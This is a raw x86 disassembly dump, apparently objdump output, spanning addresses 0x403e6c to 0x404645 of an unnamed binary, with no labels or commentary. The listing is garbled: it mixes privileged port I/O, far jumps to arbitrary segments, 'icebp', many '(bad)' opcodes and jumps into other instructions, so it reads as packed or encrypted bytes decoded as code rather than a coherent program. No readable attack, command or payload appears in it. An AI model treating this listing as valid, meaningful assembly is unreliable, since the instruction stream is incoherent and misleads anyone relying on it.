  403e6c:	xchg   edx,eax
  403e6d:	add    DWORD PTR ds:0xededee8b,edx
  403e73:	mov    BYTE PTR [esi-0x35f9e657],bl
  403e79:	or     BYTE PTR [eax],dh
  403e7b:	jmp    0x403e11
  403e7d:	int3   
  403e7e:	mov    edx,0xe86ac0a6
  403e83:	mov    edi,0x89f2484c
  403e88:	add    eax,0x2ad7535f
  403e8d:	mov    cl,0x1d
  403e8f:	jae    0x403e77
  403e91:	jnp    0x403e38
  403e93:	jne    0x403ec4
  403e95:	ret    
  403e96:	ror    BYTE PTR [esi+esi*1+0x3e08b420],1
  403e9d:	or     al,0x89
  403e9f:	pop    edi
  403ea0:	sbb    al,0x1a
  403ea2:	jbe    0x403ef6
  403ea4:	mov    dl,0xa0
  403ea6:	stos   DWORD PTR es:[edi],eax
  403ea7:	inc    edx
  403ea8:	cwde   
  403ea9:	rcl    BYTE PTR [esi],1
  403eab:	daa    
  403eac:	cmp    cl,al
  403eae:	mov    BYTE PTR [edx+edx*2],dh
  403eb1:	cli    
  403eb2:	xchg   esp,eax
  403eb3:	outs   dx,DWORD PTR ds:[esi]
  403eb4:	or     dh,BYTE PTR [edi+0x38]
  403eb7:	mov    ebx,0x3aad1bd9
  403ebc:	mov    al,ds:0x840e6cef
  403ec1:	cmp    esi,edx
  403ec3:	dec    ebx
  403ec4:	cwde   
  403ec5:	icebp  
  403ec6:	mov    ch,BYTE PTR ds:0x6c5e7c5e
  403ecc:	pop    ebp
  403ecd:	sbb    DWORD PTR [esi-0x67b9b0cc],ecx
  403ed3:	test   DWORD PTR [edi+0x34],ebp
  403ed6:	ja     0x403e7e
  403ed8:	ds xchg edi,eax
  403eda:	std    
  403edb:	and    eax,DWORD PTR [ebp-0x3edfce17]
  403ee1:	mov    ecx,0x228ddf6b
  403ee6:	(bad)  
  403ee7:	dec    esi
  403ee8:	mov    es,ecx
  403eea:	lea    edi,[ebp-0x57817e05]
  403ef0:	sbb    al,BYTE PTR [esi-0x4814df5]
  403ef6:	jecxz  0x403ef6
  403ef8:	mov    al,bl
  403efa:	and    esi,DWORD PTR ds:0x8f7b0e40
  403f00:	lea    edi,[eax]
  403f02:	jns    0x403eaa
  403f04:	adc    dl,BYTE PTR [edi+0x7a793a33]
  403f0a:	fstp   DWORD PTR [esp+ebx*4-0x6a]
  403f0e:	aam    0x64
  403f10:	out    dx,al
  403f11:	pop    ecx
  403f12:	xchg   BYTE PTR [esi],bl
  403f14:	lock jb 0x403f08
  403f17:	push   esi
  403f18:	inc    esp
  403f19:	gs jae 0x403ee9
  403f1c:	imul   esi,esi,0xffffffbf
  403f1f:	mov    esp,0xa325104a
  403f24:	inc    edx
  403f25:	aas    
  403f26:	sbb    BYTE PTR [ebp+ebp*8+0x75],dl
  403f2a:	rep ins BYTE PTR es:[edi],dx
  403f2c:	outs   dx,DWORD PTR ds:[esi]
  403f2d:	sbb    edi,DWORD PTR [eax+0x74]
  403f30:	jmp    0xa709:0xd27d8ddc
  403f37:	out    dx,eax
  403f38:	in     eax,dx
  403f39:	adc    cl,BYTE PTR [esi]
  403f3b:	leave  
  403f3c:	mov    ds:0xcd4b457e,al
  403f41:	adc    edx,DWORD PTR [edi+0x31]
  403f44:	in     eax,0x1b
  403f46:	push   esp
  403f47:	and    dl,0x75
  403f4a:	scas   eax,DWORD PTR es:[edi]
  403f4b:	jne    0x403faa
  403f4d:	in     al,0x97
  403f4f:	ror    BYTE PTR [edi+0x2b],1
  403f52:	add    eax,0x34140247
  403f57:	shl    DWORD PTR [ebx],0x2d
  403f5a:	mov    ch,0x38
  403f5c:	mov    ebp,0xcfbe312b
  403f61:	sbb    DWORD PTR [ebx],0x5a975a5b
  403f67:	dec    ebp
  403f68:	mov    DWORD PTR ds:0xe627ed3e,ebx
  403f6e:	mov    ebp,0x5d67cfd9
  403f73:	and    BYTE PTR [esp+eax*8],0xe6
  403f77:	xlat   BYTE PTR ds:[ebx]
  403f78:	fwait
  403f79:	sub    DWORD PTR [ebx-0x64db610],ebp
  403f7f:	adc    esp,ebx
  403f81:	xlat   BYTE PTR ds:[ebx]
  403f82:	inc    edx
  403f83:	adc    ebx,esi
  403f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f86:	les    ebp,FWORD PTR [edx-0x33]
  403f89:	fcom   QWORD PTR [edx+0x4d5bb440]
  403f8f:	scas   al,BYTE PTR es:[edi]
  403f90:	mov    cl,0xe0
  403f92:	mov    ebp,0x58b01a39
  403f97:	stos   BYTE PTR es:[edi],al
  403f98:	ins    BYTE PTR es:[edi],dx
  403f99:	inc    ecx
  403f9a:	cwde   
  403f9b:	and    eax,DWORD PTR [edi+0x4c]
  403f9e:	dec    edi
  403f9f:	enter  0x5538,0x90
  403fa3:	sar    DWORD PTR [eax],cl
  403fa5:	or     al,0x23
  403fa7:	xchg   edi,eax
  403fa8:	stos   BYTE PTR es:[edi],al
  403fa9:	fdivr  DWORD PTR [ecx+0x42812189]
  403faf:	(bad)  
  403fb0:	and    BYTE PTR fs:[esi-0x33135bbf],dh
  403fb7:	or     DWORD PTR [edi-0x65e58fe],ebp
  403fbd:	aas    
  403fbe:	add    BYTE PTR [esi+esi*1-0x79],al
  403fc2:	retf   0xc1a2
  403fc5:	out    dx,al
  403fc6:	cwde   
  403fc7:	rol    DWORD PTR [eax+0x35179700],1
  403fcd:	sub    al,BYTE PTR [esi-0x47]
  403fd0:	shl    DWORD PTR [esi],0x94
  403fd3:	push   edx
  403fd4:	fnstenv [edx-0x52e31788]
  403fda:	mov    edx,0x8c39b483
  403fdf:	adc    edi,DWORD PTR [edx+0x74]
  403fe2:	mov    BYTE PTR [ebx+0x54e3a44],ah
  403fe8:	xchg   ecx,eax
  403fe9:	rcl    esp,0x3e
  403fec:	outs   dx,DWORD PTR ds:[esi]
  403fed:	lock mov bl,0xde
  403ff0:	popa   
  403ff1:	test   DWORD PTR [edx],ecx
  403ff3:	jp     0x40402d
  403ff5:	mov    ds,WORD PTR ds:0xca53e752
  403ffb:	xchg   ebp,eax
  403ffc:	mov    al,ds:0xb3147759
  404001:	push   ds
  404002:	pusha  
  404003:	out    0xb5,al
  404005:	ds push 0xe560db59
  40400b:	adc    ecx,DWORD PTR [eax+0x63]
  40400e:	sbb    bl,BYTE PTR [ebx-0x28]
  404011:	cmp    ah,0xd9
  404014:	jmp    0xa0cf0602
  404019:	pop    esi
  40401a:	mov    eax,0xecdcd486
  40401f:	fadd   QWORD PTR gs:[esi]
  404022:	pop    esp
  404023:	inc    eax
  404024:	retf   0xc136
  404027:	jne    0x404081
  404029:	popa   
  40402a:	sbb    al,0xa3
  40402c:	(bad)  
  40402d:	cli    
  40402e:	repnz popf 
  404030:	mov    bl,BYTE PTR [edx-0x17]
  404033:	and    edx,DWORD PTR [ebp+0x7b]
  404036:	cwde   
  404037:	cmp    al,0x78
  404039:	fcomp  DWORD PTR [eax+0x16]
  40403c:	ds (bad) 
  40403e:	inc    BYTE PTR [edx+0x7185ff9c]
  404044:	and    ah,0xc1
  404047:	cmp    bl,BYTE PTR [ebp+0xa]
  40404a:	and    al,0x2b
  40404c:	push   edi
  40404d:	pushf  
  40404e:	outs   dx,BYTE PTR ds:[esi]
  40404f:	jb     0x403fdf
  404051:	outs   dx,DWORD PTR ds:[esi]
  404052:	mov    edx,0x537c1cf9
  404057:	push   cs
  404058:	outs   dx,DWORD PTR ds:[esi]
  404059:	ins    BYTE PTR es:[edi],dx
  40405a:	push   ecx
  40405b:	daa    
  40405c:	xchg   ebp,eax
  40405d:	sti    
  40405e:	or     dh,dl
  404060:	lds    eax,FWORD PTR [edx+0x4a]
  404063:	mov    bl,BYTE PTR [edi+0x50749ee1]
  404069:	xor    DWORD PTR [ecx-0x360e2430],ebp
  40406f:	ins    DWORD PTR es:[edi],dx
  404070:	adc    al,0x52
  404072:	xchg   ecx,eax
  404073:	(bad)  
  404075:	pop    esi
  404076:	out    0xa7,eax
  404078:	jbe    0x40404f
  40407a:	and    eax,0x15e2d67e
  40407f:	cli    
  404080:	mov    eax,ds:0x3e35c3c1
  404085:	jbe    0x404095
  404087:	addr16 sbb al,0xea
  40408a:	push   edx
  40408b:	or     eax,0x550cf5a1
  404090:	ret    0x3ead
  404093:	or     eax,0xe9bc9e6
  404098:	ja     0x660c6f10
  40409e:	call   0xfc19b854
  4040a3:	into   
  4040a4:	add    al,0x8d
  4040a6:	rol    BYTE PTR [edi],0x3a
  4040a9:	pop    es
  4040aa:	xor    ecx,DWORD PTR [ecx+edx*4-0x6e]
  4040ae:	pop    edx
  4040af:	push   0x53b5eb7f
  4040b4:	pop    ss
  4040b5:	hlt    
  4040b6:	jbe    0x40405c
  4040b8:	mov    dh,0x73
  4040ba:	mov    edi,0xf571f103
  4040bf:	cmc    
  4040c0:	mov    ch,0xa1
  4040c2:	je     0x40404e
  4040c4:	in     al,0xea
  4040c6:	pop    ecx
  4040c7:	dec    edi
  4040c8:	jne    0x404107
  4040ca:	fnstenv [ebp+0x39]
  4040cd:	or     bh,BYTE PTR [esi]
  4040cf:	push   ds
  4040d0:	jle    0x4040f0
  4040d2:	mov    esp,DWORD PTR [edi-0x7f]
  4040d5:	mov    bh,0xde
  4040d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d8:	sub    al,0x37
  4040da:	ud1    edx,esp
  4040dd:	jns    0x40413b
  4040df:	mov    BYTE PTR [edx],dl
  4040e1:	adc    BYTE PTR [edx-0x619ba5e],0x93
  4040e8:	pop    esi
  4040e9:	lea    esi,[ecx]
  4040eb:	dec    edi
  4040ec:	pop    ebx
  4040ed:	daa    
  4040ee:	xchg   esi,eax
  4040ef:	xchg   edi,eax
  4040f0:	call   0x9484a1e6
  4040f5:	int3   
  4040f6:	cmp    bl,bh
  4040f8:	sub    ch,BYTE PTR ds:0x2a711480
  4040fe:	in     al,0x83
  404100:	jo     0x4040db
  404102:	imul   ebx,edi,0xfffffff6
  404105:	fstp   TBYTE PTR [ecx]
  404107:	xchg   ebx,eax
  404108:	dec    eax
  404109:	dec    eax
  40410a:	or     eax,0x15339f9
  40410f:	and    eax,0x3a5b1a7f
  404114:	mov    ecx,0x44fcd03a
  404119:	aas    
  40411a:	cmp    BYTE PTR [ebx-0x61],al
  40411d:	mov    esp,DWORD PTR [edi-0x71]
  404120:	cmp    eax,0xb90e9d31
  404125:	jae    0x4040fa
  404127:	mov    cl,0xe2
  404129:	pop    edx
  40412a:	xor    cl,BYTE PTR [edx+eiz*1]
  40412d:	sbb    edi,DWORD PTR [ebp+0x510609c0]
  404133:	or     DWORD PTR [edi],esi
  404135:	mov    BYTE PTR ds:0x1f7ba0c9,0x72
  40413c:	out    0x7c,eax
  40413e:	std    
  40413f:	fstp   QWORD PTR [edi-0x44]
  404142:	jbe    0x404179
  404144:	cs push esi
  404146:	add    DWORD PTR [ebp-0x4b5a5931],ebx
  40414c:	mov    ecx,0x9c0b479a
  404151:	loope  0x404191
  404153:	push   ss
  404154:	call   0x503d2dbe
  404159:	fstp   DWORD PTR [ecx+0x20a98a6f]
  40415f:	push   ss
  404160:	mov    edx,0x4132eef1
  404165:	add    al,0x81
  404167:	cwde   
  404168:	lock push es
  40416a:	pop    DWORD PTR [ebx]
  40416c:	sub    ecx,DWORD PTR [esi-0x28]
  40416f:	xchg   DWORD PTR [ebp+edi*8+0x4d161dbd],eax
  404176:	push   cs
  404177:	inc    edx
  404178:	inc    eax
  404179:	sub    edi,ebx
  40417b:	enter  0x6cd9,0xa6
  40417f:	push   ecx
  404180:	scas   al,BYTE PTR es:[edi]
  404181:	(bad)  
  404182:	nop
  404183:	mov    ebx,0xa8ca1e30
  404188:	adc    DWORD PTR [ecx-0x7d],0x1326862b
  40418f:	mov    dh,0xe1
  404191:	cmp    ch,al
  404193:	in     al,dx
  404194:	jbe    0x4041d8
  404196:	outs   dx,BYTE PTR ds:[esi]
  404197:	sub    DWORD PTR [esi+ebp*1],ebp
  40419a:	jae    0x404199
  40419c:	les    esp,FWORD PTR [edx]
  40419e:	xchg   ebx,eax
  40419f:	xor    DWORD PTR [edi+0x26],ecx
  4041a2:	das    
  4041a3:	sahf   
  4041a4:	pop    ebp
  4041a5:	shl    dh,1
  4041a7:	daa    
  4041a8:	and    BYTE PTR [edi],cl
  4041aa:	push   esp
  4041ab:	loope  0x40422c
  4041ad:	ins    DWORD PTR es:[edi],dx
  4041ae:	call   0xa156:0xc916a990
  4041b5:	loope  0x4041b7
  4041b7:	dec    edx
  4041b8:	jp     0x4041a0
  4041ba:	pop    ebx
  4041bb:	cmovae ebx,DWORD PTR [ecx-0x23]
  4041bf:	mov    ebp,0x7b4e874a
  4041c4:	(bad)  [edi]
  4041c6:	retf   
  4041c7:	cmp    bl,BYTE PTR [eax]
  4041c9:	(bad)  
  4041cb:	push   edx
  4041cc:	push   esp
  4041cd:	pop    eax
  4041ce:	add    eax,0x3409a3ff
  4041d3:	rcl    BYTE PTR [edi-0x23],0x11
  4041d7:	fild   DWORD PTR ds:0xebd95e26
  4041dd:	inc    edi
  4041de:	xor    ch,ch
  4041e0:	fcom   DWORD PTR [ebp+0x625049d6]
  4041e6:	push   esi
  4041e7:	cmp    BYTE PTR [ebx],bh
  4041e9:	fwait
  4041ea:	xlat   BYTE PTR ds:[ebx]
  4041eb:	imul   ecx,edx,0xffffffdd
  4041ee:	inc    esp
  4041ef:	mov    ebp,0x4befcd0a
  4041f4:	adc    DWORD PTR [edi-0x6c],edi
  4041f7:	adc    al,0xf6
  4041f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fa:	cmp    edx,ebp
  4041fc:	rcl    bh,1
  4041fe:	pop    ss
  4041ff:	mov    esp,0xad287246
  404204:	ins    DWORD PTR es:[edi],dx
  404205:	pop    ebx
  404206:	pop    ebx
  404207:	rcr    DWORD PTR [ecx+ebp*4+0x34],0x4b
  40420c:	dec    eax
  40420d:	mov    fs,WORD PTR [esp+ecx*2+0x14a72a85]
  404214:	popf   
  404215:	dec    ebp
  404216:	sahf   
  404217:	mov    WORD PTR [eax],?
  404219:	xchg   DWORD PTR [edx+0xa3ad688],eax
  40421f:	mov    esi,0x4df3d349
  404224:	icebp  
  404225:	push   DWORD PTR [ebx+0x41]
  404228:	stos   DWORD PTR es:[edi],eax
  404229:	xchg   ecx,eax
  40422a:	pop    ss
  40422b:	cmp    al,0xcc
  40422d:	aas    
  40422e:	pop    esi
  40422f:	call   0x9c31bd8d
  404234:	ins    DWORD PTR es:[edi],dx
  404235:	fild   WORD PTR [ecx+0xab86cc8]
  40423b:	and    eax,0x72353f
  404240:	test   DWORD PTR [ebp+0x2f],ebp
  404243:	out    0xe8,eax
  404245:	add    esi,0xffffff8d
  404248:	mov    ah,cl
  40424a:	nop
  40424b:	mov    ah,0xb8
  40424d:	cmc    
  40424e:	mov    edx,0x7430bbf9
  404253:	xchg   edi,eax
  404254:	jp     0x4042b4
  404256:	pop    ebp
  404257:	lods   eax,DWORD PTR ds:[esi]
  404258:	dec    esi
  404259:	xlat   BYTE PTR ds:[ebx]
  40425a:	and    dl,BYTE PTR [edx]
  40425c:	xor    BYTE PTR [ecx+0x2c],dl
  40425f:	cdq    
  404260:	mov    al,0x6f
  404262:	xchg   esp,eax
  404263:	into   
  404264:	mov    ds:0xa1594a89,al
  404269:	inc    ecx
  40426a:	and    ecx,ebx
  40426c:	sbb    DWORD PTR [edi-0x322b3ed7],edi
  404272:	clc    
  404273:	(bad)  
  404274:	ret    
  404275:	and    eax,0xbf04dff5
  40427a:	ins    DWORD PTR es:[edi],dx
  40427b:	sbb    al,0xb
  40427d:	mov    eax,ds:0x45924c32
  404282:	out    0x25,al
  404284:	addr16 dec ebx
  404286:	sti    
  404287:	mov    ch,0x9a
  404289:	add    esi,DWORD PTR ds:0x2da76c22
  40428f:	sub    esp,DWORD PTR [esi-0x3e]
  404292:	icebp  
  404293:	xor    esp,eax
  404295:	xchg   ecx,eax
  404296:	rcl    DWORD PTR [esi+ebx*4-0x61bb19ba],1
  40429d:	jp     0x404271
  40429f:	int    0x83
  4042a1:	dec    ebp
  4042a2:	test   DWORD PTR [esi],ecx
  4042a4:	pusha  
  4042a5:	jecxz  0x4042cd
  4042a7:	adc    al,0xd4
  4042a9:	push   edi
  4042aa:	sbb    BYTE PTR [esi],al
  4042ac:	mov    ds:0x84795037,eax
  4042b1:	xchg   ebx,eax
  4042b2:	and    DWORD PTR ds:0x932fe539,ecx
  4042b8:	add    eax,0x4983c941
  4042bd:	add    al,0xd8
  4042bf:	adc    eax,DWORD PTR [eax-0x20]
  4042c2:	(bad)  
  4042c3:	sbb    esp,ebp
  4042c5:	adc    al,0xb6
  4042c7:	stos   BYTE PTR es:[edi],al
  4042c8:	jne    0x4042bd
  4042ca:	out    0xd3,eax
  4042cc:	xchg   edi,eax
  4042cd:	dec    eax
  4042ce:	or     eax,edi
  4042d0:	jge    0x404335
  4042d2:	sbb    edi,DWORD PTR [edi+eax*4]
  4042d5:	adc    eax,0x50845765
  4042da:	jg     0x40428c
  4042dc:	ror    DWORD PTR [edi+0x7e481ee7],cl
  4042e2:	cwde   
  4042e3:	outs   dx,DWORD PTR ds:[esi]
  4042e4:	dec    esp
  4042e5:	stos   DWORD PTR es:[edi],eax
  4042e6:	aaa    
  4042e7:	imul   ebp,DWORD PTR [edx-0x59920c99],0x68b271bb
  4042f1:	mov    ebp,0xbd83c31d
  4042f6:	enter  0x5a57,0x26
  4042fa:	sbb    al,0x9c
  4042fc:	push   ecx
  4042fd:	aas    
  4042fe:	fist   WORD PTR [ecx+0x3e0f1213]
  404304:	scas   al,BYTE PTR es:[edi]
  404305:	outs   dx,BYTE PTR ds:[esi]
  404306:	daa    
  404307:	mov    ecx,0xda84d1e0
  40430c:	popa   
  40430d:	lods   al,BYTE PTR ds:[esi]
  40430e:	xchg   ebp,eax
  40430f:	mov    eax,ds:0xcb2d8eb7
  404314:	mov    gs,WORD PTR [ebp+0x1742d412]
  40431a:	pushf  
  40431b:	jnp    0x4042c9
  40431d:	(bad)  
  40431e:	sbb    eax,0x6d7a5fb
  404323:	scas   al,BYTE PTR es:[edi]
  404324:	and    al,0x31
  404326:	push   0x2417b67b
  40432b:	xor    bh,BYTE PTR [ecx+0x3251553]
  404331:	imul   ebp,DWORD PTR [edi+eiz*1-0x5b6b28d5],0x4
  404339:	mov    cl,0x3f
  40433b:	xchg   esi,eax
  40433c:	mov    ebx,0xcd7cd203
  404341:	repnz test al,0x92
  404344:	ret    0x9dee
  404347:	jmp    0x7dc0:0xa6f033d3
  40434e:	xchg   esp,eax
  40434f:	ja     0x404337
  404351:	jl     0x40436a
  404353:	data16 xchg bl,dl
  404356:	call   0x9adf:0xf4e4f5ca
  40435d:	data16 loope 0x404373
  404360:	js     0x404389
  404362:	inc    ecx
  404363:	and    al,0x4b
  404365:	hlt    
  404366:	dec    esi
  404367:	das    
  404368:	jbe    0x4043e2
  40436a:	aaa    
  40436b:	rcr    BYTE PTR ds:0x68f0e010,0x54
  404372:	pop    edx
  404373:	pop    esi
  404374:	repz js 0x40430f
  404377:	enter  0x64ce,0x96
  40437b:	call   0x35ae06d3
  404380:	int    0x4a
  404382:	ins    DWORD PTR es:[edi],dx
  404383:	cdq    
  404384:	popf   
  404385:	mov    edx,0x9582f9f
  40438a:	and    cl,BYTE PTR [ebp+0x2a]
  40438d:	ret    
  40438e:	add    al,0x53
  404390:	icebp  
  404391:	clc    
  404392:	aaa    
  404393:	arpl   WORD PTR [esi+0x2d63be22],di
  404399:	or     eax,0x536a1334
  40439e:	icebp  
  40439f:	jo     0x4043c7
  4043a1:	adc    eax,0x6a292c6f
  4043a6:	(bad)  
  4043a8:	(bad)  [ecx-0x6d]
  4043ab:	cmp    BYTE PTR [edi],dl
  4043ad:	sub    al,0x23
  4043af:	xchg   ebx,eax
  4043b0:	retf   0x9409
  4043b3:	cmp    dl,dh
  4043b5:	adc    eax,0x9f8c0d2f
  4043ba:	adc    cl,bh
  4043bc:	adc    edi,DWORD PTR [edi]
  4043be:	int    0xad
  4043c0:	mov    esp,0x9a951cda
  4043c5:	clc    
  4043c6:	xchg   edi,eax
  4043c7:	test   eax,0xbbf88e33
  4043cc:	leave  
  4043cd:	xor    edi,ebp
  4043cf:	jl     0x4043a9
  4043d1:	add    eax,0xa34a31c
  4043d6:	addr16 jp 0x404391
  4043d9:	rol    bl,0x52
  4043dc:	mov    ds:0xe2c8c50,al
  4043e1:	aad    0x2c
  4043e3:	sub    BYTE PTR [esp+ebx*2+0x3cc8e820],cl
  4043ea:	nop
  4043eb:	xchg   esp,eax
  4043ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ed:	aaa    
  4043ee:	xchg   esp,eax
  4043ef:	stos   DWORD PTR es:[edi],eax
  4043f0:	ss push ss
  4043f2:	mov    WORD PTR [ebx-0x499a145b],ss
  4043f8:	xlat   BYTE PTR ds:[ebx]
  4043f9:	sbb    al,0xa0
  4043fb:	int    0x8f
  4043fd:	retf   
  4043fe:	(bad)  
  4043ff:	or     BYTE PTR [ebx],bl
  404401:	adc    al,0x83
  404403:	jns    0x404452
  404405:	outs   dx,BYTE PTR ds:[esi]
  404406:	dec    edx
  404407:	ret    0xa174
  40440a:	cmp    esp,edi
  40440c:	fmul   DWORD PTR [edx]
  40440e:	push   0x46e5e81e
  404413:	mov    ?,edi
  404415:	cmp    cl,cl
  404417:	es xor eax,0x96e9550c
  40441d:	pop    eax
  40441e:	or     edx,DWORD PTR [edi]
  404420:	sbb    ah,dl
  404422:	test   DWORD PTR [ebx+0x30cf7fb0],ebp
  404428:	add    eax,DWORD PTR [ecx+0x58371003]
  40442e:	inc    ebp
  40442f:	or     al,BYTE PTR [ecx+0x339b3457]
  404435:	mov    eax,ds:0xcb040771
  40443a:	js     0x4043d8
  40443c:	cmc    
  40443d:	pop    esi
  40443e:	mov    eax,ecx
  404440:	ret    0x2345
  404443:	clc    
  404444:	xchg   esp,eax
  404445:	fidiv  DWORD PTR [edi-0x6812add6]
  40444b:	xchg   edx,ebx
  40444d:	(bad)  
  40444e:	pop    esi
  40444f:	push   esp
  404450:	dec    ebp
  404451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404452:	jmp    0x404488
  404454:	dec    eax
  404455:	xchg   esi,eax
  404456:	mov    ah,BYTE PTR [ecx]
  404458:	aas    
  404459:	sti    
  40445a:	(bad)
  40445d:	and    DWORD PTR [esi],ebp
  40445f:	adc    eax,0xda28c30e
  404464:	and    ah,BYTE PTR [edi+0x9f5d8e6]
  40446a:	mov    ch,0x3a
  40446c:	cli    
  40446d:	pop    edx
  40446e:	pop    eax
  40446f:	out    0x55,al
  404471:	mov    bh,0x6d
  404473:	ds aas 
  404475:	out    dx,eax
  404476:	pusha  
  404477:	icebp  
  404478:	dec    ecx
  404479:	xchg   edi,eax
  40447a:	rcl    BYTE PTR [ebp+ecx*1+0x434a87bf],cl
  404481:	add    al,0xee
  404483:	popa   
  404484:	mov    ah,0xa2
  404486:	mov    es,ecx
  404488:	mov    ebp,0xedae6b55
  40448d:	mov    ?,WORD PTR [ecx-0x5f]
  404490:	mov    ch,al
  404492:	sub    BYTE PTR [esp+edi*8-0x269efca4],al
  404499:	or     bh,ah
  40449b:	fmul   QWORD PTR ds:0xfc08df88
  4044a1:	dec    DWORD PTR [edi+0x7a4d0922]
  4044a7:	xchg   edi,eax
  4044a8:	pop    edx
  4044a9:	pop    ecx
  4044aa:	mov    ds:0xdb7d75ad,al
  4044af:	(bad)  
  4044b0:	int    0xe7
  4044b2:	adc    DWORD PTR [ecx],edx
  4044b4:	call   0x1421c74f
  4044b9:	jge    0x4044a0
  4044bb:	mov    DWORD PTR cs:[eax+0x2fab1ee3],edi
  4044c2:	and    bh,BYTE PTR [edx]
  4044c4:	test   eax,0x6cab5c5c
  4044c9:	mov    al,ds:0xf60f96dd
  4044ce:	fadd   st(7),st
  4044d0:	xchg   esp,eax
  4044d1:	mov    bl,0x50
  4044d3:	pop    esp
  4044d4:	pop    esp
  4044d5:	aad    0xe0
  4044d7:	adc    cl,BYTE PTR [ecx-0xf]
  4044da:	inc    eax
  4044db:	retf   
  4044dc:	cmp    eax,0x78
  4044df:	repz xchg edi,eax
  4044e1:	aam    0xf5
  4044e3:	cmp    BYTE PTR [edi-0xe],bh
  4044e6:	jae    0x4044dc
  4044e8:	ja     0x40448c
  4044ea:	in     al,0x5
  4044ec:	clc    
  4044ed:	out    0x27,eax
  4044ef:	loope  0x40448c
  4044f1:	out    0x4b,al
  4044f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f4:	sar    BYTE PTR [esi-0x48],cl
  4044f7:	aas    
  4044f8:	leave  
  4044f9:	stos   DWORD PTR es:[edi],eax
  4044fa:	add    ch,cl
  4044fc:	cld    
  4044fd:	ins    BYTE PTR es:[edi],dx
  4044fe:	push   0x37
  404500:	lods   al,BYTE PTR ds:[esi]
  404501:	sbb    eax,0xb0d01d4e
  404506:	cmp    DWORD PTR [ebx+0x29982e34],esi
  40450c:	sub    eax,0xef3cf72c
  404511:	in     al,0xa4
  404513:	pop    edx
  404514:	out    dx,al
  404515:	adc    dh,ah
  404517:	sub    ch,BYTE PTR [ebx+0xd]
  40451a:	or     eax,0xd4af607
  40451f:	retf   
  404520:	sub    DWORD PTR [ebx-0x241fd997],eax
  404526:	pop    edx
  404527:	mov    ch,0x75
  404529:	or     al,0x2a
  40452b:	cwde   
  40452c:	cmp    eax,0xbb06a0c5
  404531:	sbb    eax,0x2200de9a
  404536:	pushf  
  404537:	adc    BYTE PTR [esi],bl
  404539:	test   bh,dl
  40453b:	sub    DWORD PTR [ebp-0x61],edx
  40453e:	cwde   
  40453f:	push   ds
  404540:	jae    0x404599
  404542:	inc    ebx
  404543:	sar    dl,cl
  404545:	fsubr  DWORD PTR [edi+edi*1-0x3]
  404549:	shr    DWORD PTR [ebp-0x2f],0xcb
  40454d:	test   BYTE PTR ds:0xbf97a742,0xa5
  404554:	(bad)  
  404555:	leave  
  404556:	pop    es
  404557:	imul   DWORD PTR [ebx-0x61]
  40455a:	loope  0x4045d2
  40455c:	mov    esi,es
  40455e:	cmp    al,BYTE PTR [edx]
  404560:	stc    
  404561:	sahf   
  404562:	inc    edx
  404563:	lods   eax,DWORD PTR ds:[esi]
  404564:	pusha  
  404565:	call   0xdd97367
  40456a:	loopne 0x40455d
  40456c:	and    al,0x80
  40456e:	adc    edx,DWORD PTR [ebp+0x24]
  404571:	sar    DWORD PTR ds:[eax+0x7df54796],cl
  404578:	and    al,0x56
  40457a:	stos   BYTE PTR es:[edi],al
  40457b:	mov    BYTE PTR [esi-0x64],ah
  40457e:	add    edx,DWORD PTR [edi+0x4c4a6514]
  404584:	in     eax,0xd8
  404586:	jne    0x4045c1
  404588:	pop    ebx
  404589:	mov    eax,ds:0xdce98fe8
  40458e:	push   es
  40458f:	cmp    al,0x5e
  404591:	test   DWORD PTR [ebx-0x1d],edi
  404594:	(bad)  
  404595:	mov    cl,0x2e
  404597:	lock les esi,FWORD PTR [esi+edx*2+0x493dc668]
  40459f:	mov    al,0x2c
  4045a1:	mov    ah,0x9e
  4045a3:	cmc    
  4045a4:	sub    BYTE PTR [ecx],ah
  4045a6:	fisttp DWORD PTR [edi+0x779e7bd3]
  4045ac:	out    dx,eax
  4045ad:	addr16 aas 
  4045af:	add    ebp,eax
  4045b1:	push   cs
  4045b2:	add    DWORD PTR [ebx+0x36],esi
  4045b5:	imul   esi,DWORD PTR [esi],0x6a655175
  4045bb:	jg     0x404548
  4045bd:	fbstp  TBYTE PTR [esi]
  4045bf:	xlat   BYTE PTR ds:[ebx]
  4045c0:	inc    esp
  4045c1:	xchg   BYTE PTR [ecx],bl
  4045c3:	dec    esi
  4045c4:	add    DWORD PTR [ebx],0xb046fab9
  4045ca:	ss jecxz 0x4045e4
  4045cd:	or     eax,0x921e5acb
  4045d2:	adc    esi,edi
  4045d4:	add    DWORD PTR [edx+ecx*4-0x67e3cd43],esi
  4045db:	dec    ecx
  4045dc:	mov    ah,0x48
  4045de:	jo     0x40462f
  4045e0:	and    dh,dh
  4045e2:	cdq    
  4045e3:	xor    DWORD PTR [ebp-0x72f23682],eax
  4045e9:	out    0x4,al
  4045eb:	sub    eax,esi
  4045ed:	inc    edx
  4045ee:	stos   DWORD PTR es:[edi],eax
  4045ef:	test   BYTE PTR [eax+eiz*4],bl
  4045f2:	sub    esi,eax
  4045f4:	loop   0x4045b3
  4045f6:	jns    0x404637
  4045f8:	sub    edx,ebx
  4045fa:	clc    
  4045fb:	push   0xff8fb489
  404600:	push   esi
  404601:	inc    esp
  404602:	loopne 0x404661
  404604:	push   es
  404605:	lods   eax,DWORD PTR ds:[esi]
  404606:	js     0x4045cb
  404608:	xor    esi,ebx
  40460a:	dec    ebp
  40460b:	(bad)  
  40460c:	jmp    0x5e119e24
  404611:	adc    ebx,DWORD PTR [eax-0x66]
  404614:	leave  
  404615:	frstor [edi-0x2a3ab2e3]
  40461b:	cmp    al,0x1f
  40461d:	scas   eax,DWORD PTR es:[edi]
  40461e:	clc    
  40461f:	loopne 0x404682
  404621:	js     0x40464a
  404623:	leave  
  404624:	in     al,dx
  404625:	pushf  
  404626:	cli    
  404627:	(bad)  
  404628:	and    ah,cl
  40462a:	enter  0xbf23,0x8e
  40462e:	cmp    esp,DWORD PTR [edx]
  404630:	iret   
  404631:	dec    esp
  404632:	fcom   QWORD PTR [ecx+ebx*1]
  404635:	(bad)  [ecx+0x67]
  404638:	sub    eax,0x711b618c
  40463d:	jg     0x4045cd
  40463f:	scas   al,BYTE PTR es:[edi]
  404640:	shl    DWORD PTR [esi],1
  404642:	retf   0x825a
  404645:	mov    edx,0x7235a73e
